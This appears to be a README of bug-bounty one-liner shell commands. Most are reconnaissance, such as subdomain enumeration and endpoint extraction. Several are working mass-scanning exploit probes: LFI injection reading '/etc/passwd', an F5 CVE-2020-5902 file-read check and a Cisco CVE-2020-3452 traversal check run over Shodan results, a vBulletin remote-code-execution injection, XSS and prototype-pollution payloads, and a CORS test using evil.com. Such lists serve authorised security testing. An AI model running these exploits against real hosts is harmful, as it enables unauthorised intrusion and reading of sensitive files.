# Awesome One-liner Bug Bounty [![Awesome](https://awesome.re/badge-flat2.svg)](https://awesome.re)
> A collection of awesome one-liner scripts especially for bug bounty.

This repository stores and houses various one-liner for bug bounty tips provided by me as well as contributed by the community. Your contributions and suggestions are heartily♥ welcome.

---

### Local File Inclusion
> @dwisiswant0

```bash
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0

```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

> @N3T_hunt3r
```bash
cat waybackurl.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null
```

### XSS
> @cihanmehmet

```bash
gospider -S targets_urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee result.txt
```

### Prototype Pollution
> @R0X4R

```bash
sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULN"
```


### CVE-2020-5902
> @Madrobot_

```bash
shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done
```

### CVE-2020-3452
> @vict0ni
```bash
while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain_list.txt
```

### vBulletin 5.6.2 - 'widget_tabbedContainer_tab_panel' Remote Code Execution
> @Madrobot_

```bash
shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;
```

### Find JS Files
> @D0cK3rG33k

```bash
assetfinder site.com | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)'|while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" |sed -e 's, 'var','"$url"?',g' -e 's/ //g'|grep -v '.js'|sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars";done
```

### Extract Endpoints from JS File
> @renniepak

```bash
cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
```

### Get CIDR & Orgz from Target Lists
> @steve_mcilwain

```bash
for DOMAIN in $(cat domains.txt);do echo $(for ip in $(dig a $DOMAIN +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done
```

### Get Subdomains from RapidDNS.io
> @andirrahmani1

```bash
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u
```

### Get Subdomains from BufferOver.run
> @\_ayoubfathi\_

```bash
curl -s https://dns.bufferover.run/dns?q=.DOMAIN.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u
```

### Get Subdomains from Riddler.io
> @pikpikcu
```bash
curl -s "https://riddler.io/search/exportcsv?q=pld:domain.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```

### Get Subdomains from VirusTotal
> @pikpikcu
```bash
curl -s "https://www.virustotal.com/ui/domains/domain.com/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from RedHunt Labs
> @redhuntlabs
```bash
curl --location 'https://reconapi.redhuntlabs.com/community/v1/domains/subdomains?domain=domain.com&page_size=10&page=1' --header 'X-BLOBR-KEY: api_key' | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```

### Get Subdomains from CertSpotter
> @caryhooper
```bash
curl -s "https://certspotter.com/api/v1/issuances?domain=domain.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | tr -d '[]"\n ' | tr ',' '\n'
```

### Get Subdomains from Archive
> @pikpikcu
```bash
curl -s "http://web.archive.org/cdx/search/cdx?url=*.domain.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```

### Get Subdomains from JLDC
> @pikpikcu
```bash
curl -s "https://jldc.me/anubis/subdomains/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
### Get Subdomains from securitytrails
> @pikpikcu
```bash
curl -s "https://securitytrails.com/list/apex_domain/domain.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u
```
###  Bruteforcing subdomain using DNS Over 
> @pikpikcu

```
while read sub;do echo "https://dns.google.com/resolve?name=$sub.domain.com&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".domain.com" | sort -u ; done < wordlists.txt
```
### Get Subdomains With sonar.omnisint.io
> @pikpikcu

```
curl --silent https://sonar.omnisint.io/subdomains/twitter.com | grep -oE "[a-zA-Z0-9._-]+\.twitter.com" | sort -u 
```
### Get Subdomains With synapsint.com
> @pikpikcu

```
curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2Fdomain.com" | grep -oE "[a-zA-Z0-9._-]+\.domain.com" | sort -u 
```
### Get Subdomains from crt.sh
> @vict0ni

```bash
curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```

### Sort & Tested Domains from Recon.dev
> @stokfedrik

```bash
curl "https://recon.dev/api/search?key=apikey&domain=example.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u |httpx -silent
```

### Subdomain Bruteforcer with FFUF
> @GochaOqradze

```bash
ffuf -u https://FUZZ.rootdomain -w jhaddixall.txt -v | grep "| URL |" | awk '{print $4}'
```

### Find All Allocated IP ranges for ASN given an IP address
> wains.be

```bash
whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
```

### Extract IPs from a File
> @emenalf

```bash
grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt
```

### Ports Scan without CloudFlare
> @dwisiswant0

```bash
subfinder -silent -d uber.com | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe
```

### Create Custom Wordlists
> @tomnomnom

```bash
gau domain.com| unfurl -u keys | tee -a wordlist.txt ; gau domain.com | unfurl -u paths|tee -a ends.txt; sed 's#/#\n#g' ends.txt  | sort -u | tee -a wordlist.txt | sort -u ;rm ends.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' wordlist.txt
```

```bash
cat domains.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a words.txt  
```

### Extracts Juicy Informations
> @Prial Islam Khan

```bash
for sub in $(cat domains.txt);do /usr/bin/gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq |egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a file.txt  ;done
```

### Find Subdomains TakeOver
> @hahwul

```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

### Get multiple target's Custom URLs from ParamSpider
> @hahwul

```bash
cat domains | xargs -I % python3 ~/tool/ParamSpider/paramspider.py -l high -o ./spidering/paramspider/% -d % ;
```

### URLs Probing with cURL + Parallel
> @akita_zen

```bash
cat alive-subdomains.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk
```

### Dump In-scope Assets from `chaos-bugbounty-list`
> @dwisiswant0

```bash
curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
```

### Dump In-scope Assets from `bounty-targets-data`
> @dwisiswant0

#### HackerOne Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'
```

#### BugCrowd Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### Intigriti Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'
```

#### YesWeHack Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

#### HackenProof Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'
```

#### Federacy Programs

```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

###  Get all the urls out of a sitemap.xml
> @healthyoutlet

```bash
curl -s domain.com/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
```

### Pure bash Linkfinder
> @ntrzz

```bash
curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > jslinks.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < jslinks.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf jslinks.txt
```

### Extract Endpoints from swagger.json
> @zer0pwn

```bash
curl -s https://domain.tld/v2/swagger.json | jq '.paths | keys[]'
```

### CORS Misconfiguration
> @manas_hunter

```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

### Find Hidden Servers and/or Admin Panels
> @rez0__

```bash
ffuf -c -u https://target .com -H "Host: FUZZ" -w vhost_wordlist.txt 
```

### Recon using api.recon.dev
> @z0idsec

```bash
curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=site.com | jg .[].domain
```

### Find live host/domain/assets
> @_YashGoti_

```bash
subfinder -d http://tesla.com -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u
```

### XSS without gf
> @HacktifyS

```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

### Extract endpoints from APK files
> @laughface809

```bash
apkurlgrep -a path/to/file.apk
```

### Get Subdomains from IPs
> @laughface809

```bash
python3 hosthunter.py <target-ips.txt> > vhosts.txt
```

### webscreenshot
> @laughface809

```bash
python webscreenshot.py -i list.txt -w 40
```

### Removes duplicate URLs and parameter combinations
> @laughface809

```bash
cat urls.txt |qsreplace -a
```

### Gather domains from content-security-policy:
> @geeknik

```bash
curl -v -silent https://$domain --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
```
